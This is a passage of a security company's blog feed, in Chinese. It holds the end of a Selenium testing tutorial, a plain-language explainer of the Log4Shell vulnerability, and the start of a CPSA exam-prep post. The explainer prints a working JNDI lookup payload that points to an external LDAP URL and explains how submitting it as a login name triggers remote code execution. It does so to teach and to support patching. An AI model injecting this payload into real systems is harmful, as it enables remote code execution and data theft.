keyword\">try</span><span class=\"token punctuation\">:</span><br>        driver<span class=\"token punctuation\">.</span>implicitly_wait<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><br>        driver<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>input_url<span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">for</span> temp_action <span class=\"token keyword\">in</span> input_action_list<span class=\"token punctuation\">:</span><br>            <span class=\"token keyword\">if</span> temp_action<span class=\"token punctuation\">[</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'click'</span><span class=\"token punctuation\">:</span><br>                driver<span class=\"token punctuation\">.</span>find_element<span class=\"token punctuation\">(</span>By<span class=\"token punctuation\">.</span>XPATH<span class=\"token punctuation\">,</span> temp_action<span class=\"token punctuation\">[</span><span class=\"token string\">'xpath'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>click<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>            <span class=\"token keyword\">if</span> temp_action<span class=\"token punctuation\">[</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'write'</span><span class=\"token punctuation\">:</span><br>                driver<span class=\"token punctuation\">.</span>find_element<span class=\"token punctuation\">(</span>By<span class=\"token punctuation\">.</span>XPATH<span class=\"token punctuation\">,</span> temp_action<span class=\"token punctuation\">[</span><span class=\"token string\">'xpath'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>send_keys<span class=\"token punctuation\">(</span>temp_action<span class=\"token punctuation\">[</span><span class=\"token string\">'text'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> ex<span class=\"token punctuation\">:</span><br>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exception:'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>ex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">finally</span><span class=\"token punctuation\">:</span><br>        driver<span class=\"token punctuation\">.</span>quit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">return</span><br><br>test_json_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><br><span class=\"token punctuation\">{</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'write'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'xpath'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'//*[@id=\"account\"]'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'text'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'account'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">{</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'write'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'xpath'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'//*[@id=\"password\"]'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'text'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'password'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">{</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'click'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'xpath'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'/html/body/div/div/div/form/button'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'text'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span><br><br>selenium_chrome_demo<span class=\"token punctuation\">(</span>input_url<span class=\"token operator\">=</span><span class=\"token string\">\"https://member.ithome.com.tw/login\"</span><span class=\"token punctuation\">,</span><br>                     input_action_list<span class=\"token operator\">=</span>test_json_list<span class=\"token punctuation\">)</span><br></code></pre>\n<p>因為帳號跟密碼是隨便寫的理論上會看到這各畫面</p>\n<p><img src=\"/img/posts/nick/selenium/se_11.jpg\" alt=\"\"></p>\n<h2 id=\"%E9%AB%98%E9%9A%8E%E5%AF%A6%E4%BD%9C%E6%96%B9%E5%BC%8F%3A-selenium-grid\"><a class=\"direct-link\" href=\"#%E9%AB%98%E9%9A%8E%E5%AF%A6%E4%BD%9C%E6%96%B9%E5%BC%8F%3A-selenium-grid\">#</a> 高階實作方式: Selenium Grid</h2>\n<p>如果要更進一步建立一個平台來控管 Selenium 的自動化測試，官方就有提供解決方案 Selenium Grid，其中管理平台稱為 Hub，實際運行測試的稱為 Node</p>\n<p><img src=\"/img/posts/nick/selenium/se_12.jpg\" alt=\"\"><br>\n圖片來源: <a href=\"https://www.edureka.co/blog/selenium-grid-tutorial\">https://www.edureka.co/blog/selenium-grid-tutorial</a></p>\n<h3 id=\"%E6%AD%A5%E9%A9%9F-1.-%E5%AE%89%E8%A3%9D-selenium-grid\"><a class=\"direct-link\" href=\"#%E6%AD%A5%E9%A9%9F-1.-%E5%AE%89%E8%A3%9D-selenium-grid\">#</a> 步驟 1. 安裝 Selenium Grid</h3>\n<p>Selenium Grid 安裝與串接推薦用 docker</p>\n<ul>\n<li>\n<ol>\n<li>建立串接用的網路(Bridge)</li>\n</ol>\n</li>\n</ul>\n<pre><code>$ docker network create grid\n</code></pre>\n<ul>\n<li>\n<ol start=\"2\">\n<li>安裝 hub</li>\n</ol>\n</li>\n</ul>\n<pre><code>$ docker run -d -p 4442-4444:4442-4444 --net grid --name selenium-hub selenium/hub:4.1.1-20211217\n</code></pre>\n<ul>\n<li>\n<ol start=\"3\">\n<li>安裝 node</li>\n</ol>\n</li>\n</ul>\n<pre><code>$ docker run -d --net grid -e SE_EVENT_BUS_HOST=selenium-hub \\\n    --shm-size=&quot;2g&quot; \\\n    -e SE_EVENT_BUS_PUBLISH_PORT=4442 \\\n    -e SE_EVENT_BUS_SUBSCRIBE_PORT=4443 \\\n    selenium/node-chrome:4.1.1-20211217\n</code></pre>\n<h3 id=\"%E6%AD%A5%E9%A9%9F-2.-node-%E8%A8%AD%E5%AE%9A\"><a class=\"direct-link\" href=\"#%E6%AD%A5%E9%A9%9F-2.-node-%E8%A8%AD%E5%AE%9A\">#</a> 步驟 2. node 設定</h3>\n<p>node 的本質就是一個幫你安裝好 Selenium WebDriver 的 Ubuntu VM，部份 Selenium 會用到的套件已經裝在裡面了，可以省掉不少架環境的時間</p>\n<ul>\n<li>\n<ol>\n<li>進入 node 的 container</li>\n</ol>\n<p><code>docker exec -i -t your_node /bin/bash</code></p>\n<p><img src=\"/img/posts/nick/selenium/se_13.jpg\" alt=\"\"></p>\n</li>\n<li>\n<ol start=\"2\">\n<li>建立測試<br>\n可參考 Selenium WebDriver 的實作方式建立測試，然後將我們之前準備好確未用到的功能 headless 打開，就可以在 node 裡面跑測試了</li>\n</ol>\n</li>\n</ul>\n<pre class=\"language-python\"><code class=\"language-python\"> selenium_chrome_demo<span class=\"token punctuation\">(</span>input_url<span class=\"token operator\">=</span><span class=\"token string\">\"https://member.ithome.com.tw/login\"</span><span class=\"token punctuation\">,</span><br>                     input_action_list<span class=\"token operator\">=</span>test_json_list<span class=\"token punctuation\">,</span><br>                     headless_mode<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></code></pre>\n<ul>\n<li>\n<ol start=\"3\">\n<li>(option) docker 版本預設開啟 VNC server，可藉此連去調整設定或建立測試<br>\n<img src=\"/img/posts/nick/selenium/se_14.jpg\" alt=\"\"></li>\n</ol>\n</li>\n</ul>\n<h3 id=\"%E6%AD%A5%E9%A9%9F-3.-%E5%BE%9E-hub-%E6%AA%A2%E8%A6%96%E6%B8%AC%E8%A9%A6%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#%E6%AD%A5%E9%A9%9F-3.-%E5%BE%9E-hub-%E6%AA%A2%E8%A6%96%E6%B8%AC%E8%A9%A6%E7%B5%90%E6%9E%9C\">#</a> 步驟 3. 從 hub 檢視測試結果</h3>\n<p><img src=\"/img/posts/nick/selenium/se_15.jpg\" alt=\"\"></p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>Selenium 在安全性測試上有他優勢或強大的地方，但是也有從實作過程中較難表現出來的缺點，所以實際運用在資安領運通常要看測試對象的特性來決定。</p>\n<p>先提一下 Selenium 整體的優缺點，Selenium 在自動化的部分非常強大，可以錄製也可以使用 Script，而且因為是透過瀏覽器來執行動作，被網站判斷是自動化程式而導致被屏蔽的機會也比較低，但缺點就是部份設定細節無法自訂，像是 header 無法自訂導致從 header 發起的攻擊無法實作。</p>\n<p>Selenium IDE 的優點是設定簡單、測試過程與結果較直觀、不需要 Codeing，總體來說就是開發成本很低，非常適合開發速度較快的團隊，但特有的缺點是無法排程，還是需要一定程度的人力介入，</p>\n<p>Selenium WebDriver 的泛用性很高，不管是動態還是靜態的網站都能進行攻擊測試，個人認為是三者中最好用的，除了共同的缺點以外，硬要說缺點的話就是改版(4.0.x)後向下兼容性不佳，部分舊版程式碼無法沿用。</p>\n<p>Selenium Grid 的優點是可以規模化，但實際執行安全性測試的時候基本上是跟 Selenium WebDriver 一樣的，所以優缺點很類似，跟其他兩者相比的缺點則是架設較為複雜，如果使用 docker 的狀況下使用 Gitlab，jenkins 等管理平台可能還更適合大部分的狀況。</p>\n<p>前面為快速說明原理挑了一些簡單易懂的攻擊來示範，實際上還有更多更進階的用法，如果閱覽數量夠多，之後會再加開一篇分享一些更進階的用法與經典案例，有任何資安方面相關的問題都歡迎留言討論，或者直接到 Cymetrics 尋求協助。</p>\n",
      "date_published": "2021-12-28T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/what-is-log4j-and-log4shell/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/what-is-log4j-and-log4shell/",
      "title": "從監視攝影機理解 Log4j 跟 Log4Shell 漏洞",
      "content_html": "<p><img src=\"/img/posts/huli/what-is-log4j-and-log4shell/cover.jpeg\" alt=\"\"><br>\n<span data-nosnippet>（圖片來自於 <a href=\"https://unsplash.com/@sharp_shutter\">Joe Gadd</a> on <a href=\"https://unsplash.com\">Unsplash</a>）</span></p>\n<!-- summary -->\n<!-- 關於 log4j 漏洞，已經有許多技術上的分析跟新聞，這篇文章希望以白話文的角度幫助沒有技術背景的人理解 log4j 漏洞是什麼，以及為何這麼嚴重 -->\n<!-- summary -->\n<p>2021 年末資安界最大的新聞莫過於 Log4j 的漏洞，編號為 CVE-2021-44228，又被稱為 Log4Shell，甚至被一些人形容為「核彈級漏洞」，可見這個漏洞的影響程度之深遠。</p>\n<p>關於技術上的分析已經有很多篇文章在講解了，但對於不懂技術的人來說，可能只知道這個漏洞很嚴重，卻不知道為什麼嚴重，也不知道原理到底是什麼，因此我想從讓非技術背景的人也能理解的角度出發，寫一篇比較白話的文章。</p>\n<h2 id=\"%E5%BE%9E%E7%9B%A3%E8%A6%96%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%AB%87%E8%B5%B7\"><a class=\"direct-link\" href=\"#%E5%BE%9E%E7%9B%A3%E8%A6%96%E6%94%9D%E5%BD%B1%E6%A9%9F%E8%AB%87%E8%B5%B7\">#</a> 從監視攝影機談起</h2>\n<p>我有個朋友叫小明，他家是開雜貨店的。就跟其他商店一樣，在店裡有一支監視攝影機，怕有什麼消費糾紛或是有人來搶劫或偷東西，因此讓攝影機 24 小時全程錄影，真的發生什麼事了，就會有證據留存下來。</p>\n<p>但攝影機的鏡頭角度有限，不可能把整間店面的影像都拍下來，就算真的都拍下來了，要存的資料也會太多（除非小明很有錢，買了一堆攝影機）。因此，攝影機只會對準一些非常重要、值得記錄下來的地方，像是收銀台等等。</p>\n<p>原本這支攝影機用了十幾年都沒什麼事情，畢竟不就是把影像記錄起來嗎，能有什麼事情？但最近卻突然有人發現一個攝影機的隱藏功能（嚴格來講不是隱藏功能，因為攝影機的說明書上其實有提到，可是大家都懶得看那一百多頁的說明書，所以很少人知道這個功能）</p>\n<p>這個功能是什麼呢？那就是除了錄影以外，這台監視攝影機還有個智慧圖片辨識的功能，如果它看到特定的影像，會根據影像的內容去執行相對應的動作。舉例來說好了，這個圖片辨識功能需要把指令寫在 100x100 的板子上，一定要黑底白字加上特定格式，像這個樣子：</p>\n<p><img src=\"/img/posts/huli/what-is-log4j-and-log4shell/command.png\" alt=\"\"></p>\n<p>當攝影機看到上面的圖，符合特定格式，就執行了上面的指令：「關機」，就真的關機了！但關機還沒什麼，指令還可以寫說「把攝影機資料全都給我」之類的，再者，攝影機本來就會即時連線到其他伺服器，這個指令也可以對那些伺服器做操作，例如說把上面的資料全都偷下來等等。</p>\n<p>總之呢，一旦讓攝影機拍到指定格式的東西，就會幫你執行指令。</p>\n<p>這個功能被爆出來以後，血流成河，因為太多地方都有監視攝影機了，因此許多人都帶著這個板子去看看會不會觸發這個功能。攝影機有分型號，只有一台叫做 log4j 的攝影機會出事，其他不會，但要注意的事情是有些攝影機它雖然不叫做這名字，可其實是從 log4j 作為基底改出來的，就一樣會出事。</p>\n<p>而有些東西儘管不是攝影機也會出事，例如說有台智慧冰箱，號稱內部有微型攝影機可以即時監控冰箱內部狀況，恰巧這個微型攝影機就是 log4j 這個型號的攝影機改版出來的，所以也有同樣的問題。</p>\n<p>你想想看，如果監視攝影機出了這個問題，那全台灣、全世界這麼多人用這個型號的監視攝影機，當然會引起軒然大波，只要讓攝影機拍到特定的東西就會執行指令，這可嚴重了。</p>\n<p>以上是對於 log4j 漏洞的簡單比喻，在這個故事中雜貨店就像是你的網站，而攝影機的功能就是拿來紀錄（log）對於網站的那些請求（request），整個故事只要記兩個重點就好：</p>\n<ol>\n<li>log4j 是拿來記錄東西用的</li>\n<li>漏洞原理是只要紀錄某些特定格式的文字，就會觸發一個功能可以執行程式碼</li>\n</ol>\n<p>白話的簡易比喻到這邊先結束，想要更了解 log4j，我們就必須先來看看什麼是 log。</p>\n<h2 id=\"%E6%9C%89%E9%97%9C%E6%96%BC-log-%E9%80%99%E4%BB%B6%E4%BA%8B\"><a class=\"direct-link\" href=\"#%E6%9C%89%E9%97%9C%E6%96%BC-log-%E9%80%99%E4%BB%B6%E4%BA%8B\">#</a> 有關於 log 這件事</h2>\n<p>log 的中文翻譯叫做日誌，我相信許多人對這個名詞並不陌生，如果你有跟工程師合作過，他在解決問題時可能會說：「我去看一下 log」；或是如果你們跟合作廠商各執一詞，他說 A 你們說 B，這時候就會說：「不然看一下 log 吧，看看是誰的問題」</p>\n<p>當你跟公司的 IT 合作解決電腦上的小問題時，他也會跟你說要去某個地方複製 log 給他，他才知道發生了什麼事情。</p>\n<p>log 就像是一台 24 小時全年無休的監視攝影機一樣，需要紀錄起重要事物的狀況。</p>\n<p>那為什麼需要有 log 呢？這問題就像是「為什麼要有監視攝影機？」一樣，答案很簡單，因為出事的時候才有證據。就像行車記錄器一樣，裝了以後若不幸發生車禍，就可以協助判斷肇責。</p>\n<p>舉個例子，假設我是 A 公司，我們公司是做購物網站的，而通常金流這一塊並不會自己做，而是會找其他做金流的廠商合作，在後端去「串接」金流服務商提供的功能，講白話一點就是：「當使用者要付款時，我把使用者導過去金流廠商的頁面，付款完再導回來我們網站」，相信有在網路上購物的大家應該很熟悉這個流程。</p>\n<p>在這個過程中，雙方都必須留下紀錄，確保未來發生問題時有證據可以輔助說明。</p>\n<p>例如說有天 A 公司突然接到一堆客訴說沒辦法付款，這時 A 公司直接打電話去金流商，罵說你們這什麼爛服務，怎麼突然壞掉，而金流商此時提供了伺服器的 log，說：「沒有啊，我們這邊從今天早上八點開始就沒有你們導過來的紀錄了，應該是你們的問題吧？」，後來 A 公司檢查了自己這邊的服務，確實是因為今天早上的版本更新出了問題而導致，跟金流商一點關係都沒有。</p>\n<p>這就是 log 的重要性，當出事的時候你才有證據可以盤查，才能盡可能還原當初的狀況。</p>\n<p>做開發者的大家都知道 log 很重要，所以 log 基本上是必備的，以網站後端來說，他可能會在交易發生錯誤時留下一筆 log，也有可能在發生非預期錯誤時寫下 log，或是用 log 紀錄 request 中的一些欄位，比如說瀏覽器版本好了，給自己公司內部的數據分析系統來使用。</p>\n<p>因此 log 是個十分常見的功能。這也是為什麼如果這個功能出事了，造成的後果會非常嚴重。</p>\n<h2 id=\"log4j-%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F\"><a class=\"direct-link\" href=\"#log4j-%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F\">#</a> log4j 是什麼？</h2>\n<p>在寫網站後端的程式碼時，會有不同的程式語言可以選擇，例如說 Python、JavaScript、PHP 或是 Java 等等，而這些程式語言都會有些專門做 log 的套件，簡單來說就是有人已經幫你把功能都寫好了，你只要用就好了。</p>\n<p>而 Java 有一個很好用的 log 套件，就叫做 log4j。而這個套件是隸屬於 Apache 軟體基金會底下，因此全名又叫做 Apache Log4j。</p>\n<p>Apache 底下有很多不同的軟體跟套件，例如說：</p>\n<ul>\n<li>Apache HTTP Server（大家最常看到的是這個）</li>\n<li>Apache Cassandra</li>\n<li>Apache Tomcat</li>\n<li>Apache Hadoop</li>\n<li>Apache Struts</li>\n<li>...</li>\n</ul>\n<p>所以 Apache Server 跟 Apache log4j 完全是不同的兩個東西，我知道你用 Apache Server，跟你有沒有用 log4j 是兩件事情。</p>\n<p>這次出問題的套件就是 log4j，而出問題的原因跟我開頭講的一樣，有一個鮮為人知的功能有著安全性的漏洞，只要 log4j 在記錄 log 時記錄到某個特定格式的東西，就會去執行相對應的程式碼，就像開頭提的那個「關機」的板板一樣。</p>\n<p>再講更詳細一點，其實並不是直接執行程式碼，那一段特定格式長得像這樣：</p>\n<pre><code>${jndi:ldap://cymetrics.io/test}\n</code></pre>\n<p>先不要管那些你看不懂的字，你可以很明顯看到裡面有一段東西很像網址，對，它就是網址，當 log4j 紀錄上面那一串字的時候，它發現這串字符合特定格式，就會去裡面的網址（<code>cymetrics.io/test</code>）下載程式碼然後執行，因此這是一個 RCE（Remote Code Execution，遠端程式碼執行）漏洞。</p>\n<p>前面我有提過後端會記錄許多東西，假設今天有個後端服務是用 Java 寫的，而它用 log4j 記錄了使用者登入失敗時輸入的帳號，這時我只要用 <code>${jndi:ldap://cymetrics.io/test}</code> 這個帳號登入，就能夠觸發 log4j 的漏洞，讓它執行我準備好的程式碼。</p>\n<p>只要能執行程式碼，我就可以做很多事情，例如說把伺服器上的資料偷走，或是安裝挖礦軟體幫我挖礦等等。</p>\n<h2 id=\"%E7%82%BA%E4%BB%80%E9%BA%BC%E9%80%99%E5%80%8B%E6%BC%8F%E6%B4%9E%E5%A6%82%E6%AD%A4%E5%9A%B4%E9%87%8D%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E7%82%BA%E4%BB%80%E9%BA%BC%E9%80%99%E5%80%8B%E6%BC%8F%E6%B4%9E%E5%A6%82%E6%AD%A4%E5%9A%B4%E9%87%8D%EF%BC%9F\">#</a> 為什麼這個漏洞如此嚴重？</h2>\n<p>第一，log4j 這個套件使用的人數極多，只要你有用 Java，幾乎都會用這個套件來紀錄 log</p>\n<p>第二，觸發方式容易，你只要在 request 的各個地方塞滿這些有問題的字串，server 只要有記錄下來其中一個，就能夠觸發漏洞，而前面我們有提到紀錄 log 本來就是家常便飯的事情</p>\n<p>第三，能造成的影響極大，漏洞被觸發之後就是最嚴重的 RCE，可以直接執行任意程式碼</p>\n<p>結合以上這三點，讓它成了一個核彈級的漏洞。到底有多嚴重，看看這些新聞標題就知道：</p>\n<ol>\n<li><a href=\"https://blog.twnic.tw/2021/12/16/21369/\">Apache Log4j 漏洞影響巨大，美國資安主管機關通令政府單位立即修復</a></li>\n<li><a href=\"https://www.bnext.com.tw/article/66743/log4j-cybersecurity?fbclid=IwAR1JEHJxA3nUaPVXglcxE1qrDRrRNHkPent3FdXBgtAGYKBxXDGUozt-Yyc\">微軟、蘋果都受波及！日誌框架Apache Log4j爆漏洞，堪稱近10年最大資安威脅</a></li>\n<li><a href=\"https://www.ithome.com.tw/news/148391\">【Log4Shell漏洞資訊更新】Log4j 2.15.0修補不全、Apache再釋2.16.0新版，國家駭客已開始行動</a></li>\n</ol>\n<p>還有一點差點忘了提，有許多其他的軟體也都用了 log4j 這個套件，因此也會有問題，國外有人整理出一份被影響的清單：<a href=\"https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/\">Log4Shell log4j vulnerability (CVE-2021-44228 / CVE-2021-45046) - cheat-sheet reference guide</a>，洋洋灑灑一大片，像是 Minecraft 這個遊戲的伺服器也有用到 log4j，所以也被這個漏洞給影響。</p>\n<h2 id=\"%E8%A9%B2%E6%80%8E%E9%BA%BC%E7%9F%A5%E9%81%93%E6%88%91%E6%9C%89%E6%B2%92%E6%9C%89%E8%A2%AB%E9%80%99%E5%80%8B%E6%BC%8F%E6%B4%9E%E5%BD%B1%E9%9F%BF%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E8%A9%B2%E6%80%8E%E9%BA%BC%E7%9F%A5%E9%81%93%E6%88%91%E6%9C%89%E6%B2%92%E6%9C%89%E8%A2%AB%E9%80%99%E5%80%8B%E6%BC%8F%E6%B4%9E%E5%BD%B1%E9%9F%BF%EF%BC%9F\">#</a> 該怎麼知道我有沒有被這個漏洞影響？</h2>\n<p>可以先確認自己家的程式有沒有用到 log4j 這個套件以及套件的版本，也需要一併檢查有沒有使用上面那張清單列出來的其他軟體。</p>\n<p>如果你是工程師，也可以用一些現有的工具檢測是否受到漏洞影響，像是：<a href=\"https://github.com/fullhunt/log4j-scan\">log4j-scan</a> 或是 jfrog 提供的 <a href=\"https://github.com/jfrog/log4j-tools\">log4j-tools</a> 等等。</p>\n<p>或如果真的不知道該如何處理，也可以<a href=\"https://cymetrics.io/zh-tw/free-rating\">聯絡我們</a>，看我們可以怎樣幫助你。</p>\n<h2 id=\"%E8%A9%B2%E5%A6%82%E4%BD%95%E4%BF%AE%E8%A3%9C%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E8%A9%B2%E5%A6%82%E4%BD%95%E4%BF%AE%E8%A3%9C%EF%BC%9F\">#</a> 該如何修補？</h2>\n<p>由瑞士 CERT 發表的這篇文章：<a href=\"https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/\">Zero-Day Exploit Targeting Popular Java Library Log4j</a> 中，有給了一張從各個環節去防禦的圖：</p>\n<p><img src=\"/img/posts/huli/what-is-log4j-and-log4shell/attack.png\" alt=\"\"></p>\n<p>如果來不及把根本原因修掉，可以先上 WAF（Web Application Firewall），簡單來說就是針對網站的防火牆，把那些惡意的字串擋掉，例如說 <a href=\"https://blog.cloudflare.com/protection-against-cve-2021-45046-the-additional-log4j-rce-vulnerability/\">Cloudflare</a> 就在第一時間增加了 WAF 的規則加以阻擋，不過也有很多人在研究怎麼繞過 WAF 的規則，因此這是治標不治本的做法。</p>\n<p>治本的方法就是把 log4j 停用或是升版，升級到不會被這個漏洞影響的版本，但有些時候第一時間的改版可能沒有把漏洞完全補掉，因此記得更新完以後還是要密切注意是否有更新的版本。例如說在這篇文章寫完後過沒多久，官方就釋出了第三個 patch 修復其他相關問題：<a href=\"https://thehackernews.com/2021/12/apache-issues-3rd-patch-to-fix-new-high.html\">Apache Issues 3rd Patch to Fix New High-Severity Log4j Vulnerability</a></p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>一個很多人用的套件，加上一個很常見的功能，再加上一個很簡單的攻擊方式以及嚴重的後果，就成了一個可以被載入史冊的漏洞。</p>\n<p>文中有些比喻為了不要講得太細節，會是精簡過後的版本，不一定能完全涵蓋本來的漏洞，在轉換成故事比喻的過程中一定會有一些遺漏的部分，但對於整體的理解我覺得影響不大。</p>\n<p>如果你想了解更技術的細節以及時間軸，很推薦這一支影片：<a href=\"https://www.youtube.com/watch?v=w2F67LbEtnk&amp;t=16s&amp;ab_channel=LiveOverflow\">Hackers vs. Developers // CVE-2021-44228 Log4Shell</a>，裡面講得很清楚，也探討了開發者與資安從業人員的關係。</p>\n<p>最後，希望這篇文章能讓不懂技術的大家更了解 log4shell 是怎樣的漏洞，以及這個漏洞為什麼如此嚴重。文中若有錯誤也請不吝留言指正，感謝。</p>\n",
      "date_published": "2021-12-18T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/crest-cpsa-prepare/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/crest-cpsa-prepare/",
      "title": "CPSA(CREST Practitioner Security Analyst) 資安分析師考試心得",
      "content_html": "<!-- summary -->\n<p>為了工作上的需求，我在近期考過了 CPSA(CREST Practitioner Security Analyst) 資安分析師這張證照，趁著記憶猶新來分享考試的準備以及一些心得。</p>\n<!-- summary -->\n<p>CREST 這個組織與 CPSA 這張證照在網路上可以找到的中文資料極少，在台灣算是比較冷門的一張證照，我是看了這篇：<a href=\"https://medium.com/blacksecurity/crestcpsa-5a07e25e7da3\">ECSA v10 等效申請CREST CPSA 資安分析師證照教學 / ECSA with CPSA Equivalency Recognition Step</a> 才對這個組織以及這張證照有基本的理解。</p>\n<p>我在十二月跟另外一個同事去考了這張證照，都有順利考到，趁著剛考完沒多久，趕快來寫篇心得記錄一下。</p>\n<h2 id=\"cpsa-%E4%BB%8B%E7%B4%B9\"><a class=\"direct-link\" href=\"#cpsa-%E4%BB%8B%E7%B4%B9\">#</a> CPSA 介紹</h2>\n<p>還是不免俗地簡單介紹一下 CPSA 這張證照，全名為 CREST Practitioner Security Analyst，是 CRSET 的入門證照，官網有附上 CRSET 系列的圖，可以看到 CPSA 隸屬於滲透測試的分類底下，是這分類最初階的一張證照：</p>\n<p><img src=\"/img/posts/huli/crest-cpsa-prepare/p1.png\" alt=\"\"></p>\n<p>在行政院公布的<a href=\"https://nicst.ey.gov.tw/Page/D94EC6EDE9B10E15/3386e586-1930-4f48-9b5e-1c9f256b7549\">資通安全證照專業清單</a>裡面，也有出現這一張證照：</p>\n<p><img src=\"/img/posts/huli/crest-cpsa-prepare/p2.png\" alt=\"\"></p>\n<p>底下則是<a href=\"https://www.crest-approved.org/examination/practitioner-security-analyst/index.html\">官網</a>對於這張證照的介紹：</p>\n<blockquote>\n<p>The CREST Practitioner Security Analyst (CPSA) examination is an entry-level examination that tests a candidate’s knowledge in assessing operating systems and common network services at a basic level below that of the main CRT and CCT qualifications.  The CPSA examination also includes an intermediate level of web application security testing and methods to identify common web application security vulnerabilities.</p>\n</blockquote>\n<p>說明了 CPSA 是張入門的證照，而測驗內容則是基本的作業系統與網路相關安全知識，還有中階的 Web Security 相關知識。</p>\n<p>考試的形式是 120 題的選擇題（有五個選項的單選題），總共有兩個小時的時間可以作答，需要去特定的考場（Pearson Vue test centres）考試。</p>\n<h2 id=\"cpsa-%E8%80%83%E8%A9%A6%E5%85%A7%E5%AE%B9%E5%8F%8A%E6%BA%96%E5%82%99\"><a class=\"direct-link\" href=\"#cpsa-%E8%80%83%E8%A9%A6%E5%85%A7%E5%AE%B9%E5%8F%8A%E6%BA%96%E5%82%99\">#</a> CPSA 考試內容及準備</h2>\n<p>CPSA 官網有提供考試的<a href=\"https://www.crest-approved.org/wp-content/uploads/crest-crt-cpsa-technical-syllabus-2.4.pdf\">大綱</a>，內容滿詳細的，但我比較喜歡這個 CPSA 的<a href=\"https://icsiglobal.com/all-courses-list/29-crest-cpsa-exam-preparation-cpsa/region-UK/\">課程</a>提供的簡化過的版本，稍微看過一遍之後會對考試的內容有基本的理解：</p>\n<h3 id=\"module-1%3A-soft-skills-and-assessment-management\"><a class=\"direct-link\" href=\"#module-1%3A-soft-skills-and-assessment-management\">#</a> Module 1: Soft Skills and Assessment Management</h3>\n<ol>\n<li>Engagement Lifecycle</li>\n<li>Law and Compliance</li>\n<li>Scoping</li>\n<li>Understanding, Explaining and Managing Risk</li>\n<li>Record Keeping, Interim Reporting and Final Results</li>\n</ol>\n<h3 id=\"module-2%3A-core-technical-skills\"><a class=\"direct-link\" href=\"#module-2%3A-core-technical-skills\">#</a> Module 2: Core Technical Skills</h3>\n<ol>\n<li>IP Protocols</li>\n<li>Network Architectures</li>\n<li>Network mapping and Target Identification</li>\n<li>Filtering Avoidance Techniques</li>\n<li>OS Fingerprinting</li>\n<li>Application Fingerprinting and Evaluating Unknown Services</li>\n<li>Cryptography</li>\n<li>Applications of Cryptography</li>\n<li>File System Permissions</li>\n<li>Audit Techniques</li>\n</ol>\n<h3 id=\"module-3%3A-background-information-gathering-and-open-source\"><a class=\"direct-link\" href=\"#module-3%3A-background-information-gathering-and-open-source\">#</a> Module 3: Background Information Gathering and Open Source</h3>\n<ol>\n<li>Registration Records</li>\n<li>Domain Name Server (DNS)</li>\n<li>Google Hacking and Web Enumeration</li>\n<li>Information Leakage from Mail Headers</li>\n</ol>\n<h3 id=\"module-4%3A-networking-equipment\"><a class=\"direct-link\" href=\"#module-4%3A-networking-equipment\">#</a> Module 4: Networking Equipment</h3>\n<ol>\n<li>Management Protocols</li>\n<li>Network Traffic Analysis</li>\n<li>Networking Protocols</li>\n<li>IPsec</li>\n<li>VoIP</li>\n<li>Wireless</li>\n<li>Configuration Analysis</li>\n</ol>\n<h3 id=\"module-5%3A-microsoft-windows-security-assessment\"><a class=\"direct-link\" href=\"#module-5%3A-microsoft-windows-security-assessment\">#</a> Module 5: 